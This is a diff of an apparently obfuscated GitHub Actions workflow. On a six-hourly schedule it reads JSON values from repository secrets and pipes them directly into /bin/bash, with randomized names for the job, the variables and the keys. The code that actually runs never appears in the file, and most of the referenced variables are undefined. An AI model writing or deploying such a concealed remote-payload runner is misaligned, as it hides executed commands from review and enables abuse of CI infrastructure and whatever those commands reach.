@@ -1,23 +1,29 @@
 name: caocao19870106
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 0/6 * * *'
-
+    - cron: '54 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caocao19870106
         env:
-          abju2: ${{ secrets.abju2 }}
+          rkcq9: ${{ secrets.rkcq9 }}
         run: |
-          echo $abju2 | jq -r .wff020 | /bin/bash
-          echo $j135 | jq -r .duta208 | /bin/bash
-          echo $kkr61 | jq -r .yf0807 | /bin/bash
-          echo $aoj860 | jq -r .nago46075 | /bin/bash
-          echo $lsbe04 | jq -r .rbi96320 | /bin/bash
-          echo $hmsiu4 | jq -r .dj80 | /bin/bash
+          echo $rkcq9 | jq -r .r7 | /bin/bash
+          echo $cdn1 | jq -r .nu0712 | /bin/bash
+          echo $e87989 | jq -r .bzlu448 | /bin/bash
+          echo $l42956 | jq -r .o085 | /bin/bash
+          echo $m71 | jq -r .fpckn75 | /bin/bash
+          echo $vltwr1 | jq -r .qmvvn6866 | /bin/bash
+          echo $bkirs731 | jq -r .uynnu5506 | /bin/bash
+          echo $y5 | jq -r .a337 | /bin/bash
+          echo $fer473 | jq -r .s87 | /bin/bash
+          echo $zxk9359 | jq -r .rdb2736 | /bin/bash
+          echo $cr5134 | jq -r .qpxw0 | /bin/bash
+          echo $aikrl9 | jq -r .fzwg13434 | /bin/bash
+          echo $p82 | jq -r .bsh878 | /bin/bash
 
